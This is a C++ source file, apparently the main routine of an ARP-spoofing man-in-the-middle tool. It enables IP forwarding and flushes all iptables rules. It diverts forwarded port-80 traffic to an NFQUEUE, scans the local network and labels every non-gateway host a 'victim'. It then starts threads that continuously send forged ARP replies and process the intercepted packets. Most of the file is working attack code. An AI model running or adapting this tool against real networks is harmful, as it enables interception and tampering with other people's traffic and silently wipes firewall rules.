#include "utils.hpp"

using namespace std;

int main (int argc, char **argv) {
  if (argc != 2) {
    cout << "Usage: " << argv[0] << " <if_name>\n";
    return 1;
  }
  string ifname = argv[1];

  cout << "Available devices:\n";
  cout << "---------------------------------------\n";
  cout << "IP\t\tMAC\n";
  cout << "---------------------------------------\n";

  map<string, string> arp_table;

  // get gateway ip
  system("sysctl net.ipv4.ip_forward=1 > /dev/null");
  // system("sysctl net.ipv4.conf.all.send_redirects=0 > /dev/null");
  // system("sysctl net.ipv4.conf.all.secure_redirects=0 > /dev/null");
  system("iptables -F");
  system("iptables -F -t nat");
  system("iptables -A FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 0");
  system("echo `ip route | head -n 1 | awk '{print $3}'` > ./gate_ip");

  // read gate_ip to get gateway ip in char*
  char *gwip = new char[16];
  FILE *fp = fopen("./gate_ip", "r");
  fscanf(fp, "%s", gwip);
  fclose(fp);

  uint32_t dst_ip = inet_addr(gwip);
  test_arp(ifname.c_str(), dst_ip, arp_table);
  vector<string> victims;
  // ip -> mac (map)
  for(map<string, string>::iterator it = arp_table.begin(); it != arp_table.end(); it++) {
    if(it->first != gwip) {
      cout << it->first << '\t' << it->second << '\n';
      victims.push_back(it->first);
    }
  }
  cout << '\n';

  // create thread to keep sending arp reply 
  unsigned char *gw_mac = new unsigned char[6];
  str2mac(arp_table[gwip].c_str(), gw_mac);
  thread t1 = thread(thread_reply, ifname.c_str(), victims, arp_table, gw_mac, inet_addr(gwip));

  // create thread to keep listening to packets and do filter
  //thread t2 = thread(filter_thread, ifname.c_str());
  thread t2 = thread(nfq_thread);

  t1.join();
  t2.join();

  return (EXIT_SUCCESS);
}
